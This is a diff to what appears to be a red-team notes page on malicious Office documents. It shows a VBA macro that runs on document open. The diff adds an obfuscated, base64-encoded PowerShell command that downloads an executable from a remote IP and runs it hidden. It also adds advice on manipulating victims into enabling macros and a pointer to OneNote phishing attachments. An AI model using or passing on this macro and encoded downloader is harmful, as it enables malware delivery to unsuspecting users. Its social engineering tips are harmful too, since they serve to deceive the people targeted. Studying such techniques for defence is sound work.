@@ -101,27 +101,17 @@ Private Sub Document_Open()
 Test
 End Sub
 
-Private Sub DocumentOpen()
-Test
-End Sub
-
-Private Sub Auto_Open()
-Test
-End Sub
-
-Private Sub AutoOpen()
-Test
-End Sub
-
-Private Sub Auto_Exec()
-Test
-End Sub
-
 Private Sub Test()
 Shell ("cmd /c calc.exe")
 End Sub
 ```
 Save the document as `.doc` or `.docm` and run it!
+
+For malicious execution POC, you might want to replace `calc.exe` with `powershell -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOAAwAC4AMQAyADkAOgA4ADAAMAAwAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcALAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A`. The encoded base64 can be generate using this [recipe](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')).
+
+Also, to lure user to click enable content, you might need some social engineering such as pictures or words that can manipulate user such as this picture:
+
+![image](https://user-images.githubusercontent.com/56353946/226780899-43d02a21-e38d-4a5d-96f4-4f0d2c970a62.png)
 
 Enabling the content upon opening the document will execute our code.
 ![image](https://user-images.githubusercontent.com/56353946/203389403-6939fd42-fdb2-443e-9514-df0b28870163.png)
@@ -132,6 +122,13 @@ You can learn VBA coding from the resouces below:
 1. https://www.trustedsec.com/blog/intro-to-macros-and-vba-for-script-kiddies/
 2. https://www.trustedsec.com/blog/the-vba-language-for-script-kiddies/
 3. https://www.trustedsec.com/blog/developing-with-vba-for-script-kiddies/
+
+# OneNote
+
+Refer this source: https://assume-breach.medium.com/home-grown-read-team-lets-make-some-onenote-phishing-attachments-a14f4ef6ccc4
+
+![image](https://user-images.githubusercontent.com/56353946/226783305-41de9cc3-e2cb-4420-9ba8-8976e2c8b56d.png)
+
 
 # DDE attack
 This attack was commonly use by attacker out there, where once a victim was phished by clicking the "yes" button in the Warning message by Office, they can immidiately being compromised by the attacker. But, as far as I'm concerned. This vulnerability have been patched by Microsoft. So, the older version of Microsoft Office still vulnerable to this.
